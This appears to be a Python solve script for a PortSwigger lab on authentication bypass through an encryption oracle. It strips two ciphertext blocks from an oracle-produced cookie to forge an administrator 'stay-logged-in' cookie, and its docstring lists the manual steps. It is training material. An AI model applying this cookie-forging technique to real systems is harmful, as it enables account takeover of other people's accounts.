#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Authentication bypass via encryption oracle.

The notification cookie encrypts "Invalid email address: <input>" using the
same key as the stay-logged-in cookie ("username:timestamp"). By padding the
input so the prefix fills 2 full 16-byte blocks, we can strip those blocks
from the ciphertext and get an encrypted "administrator:TIMESTAMP".

Steps (manual via Burp):
  1. Log in as wiener with "stay logged in" — note stay-logged-in cookie.
  2. Decrypt it via notification cookie to get TIMESTAMP.
  3. Submit email "xxxxxxxxxadministrator:TIMESTAMP" to get oracle ciphertext.
  4. Strip first 32 bytes → forged admin cookie.
  5. Remove session cookie, set stay-logged-in to forged value, visit /admin.

This script automates steps 3-4 given the oracle ciphertext.
"""

import argparse
import base64
import urllib.parse


def strip_prefix(notification_cookie_encoded: str, prefix_blocks: int = 2) -> str:
    """
    Strip the first `prefix_blocks` × 16 bytes from the notification ciphertext.
    Returns the URL-encoded base64 of the remaining bytes.
    """
    raw = base64.b64decode(urllib.parse.unquote(notification_cookie_encoded))
    stripped = raw[prefix_blocks * 16:]
    return urllib.parse.quote(base64.b64encode(stripped))


def main():
    parser = argparse.ArgumentParser(
        description="Forge stay-logged-in cookie by stripping oracle prefix"
    )
    parser.add_argument(
        "notification_cookie",
        help="URL-encoded notification cookie after submitting 'xxxxxxxxxadministrator:TIMESTAMP'"
    )
    args = parser.parse_args()

    forged = strip_prefix(args.notification_cookie)
    print(f"[+] Forged stay-logged-in cookie:")
    print(f"    {forged}")
    print()
    print("[!] Remove your session cookie, then set stay-logged-in to this value.")
    print("[!] Visit /admin to access the admin panel as administrator.")


if __name__ == "__main__":
    main()
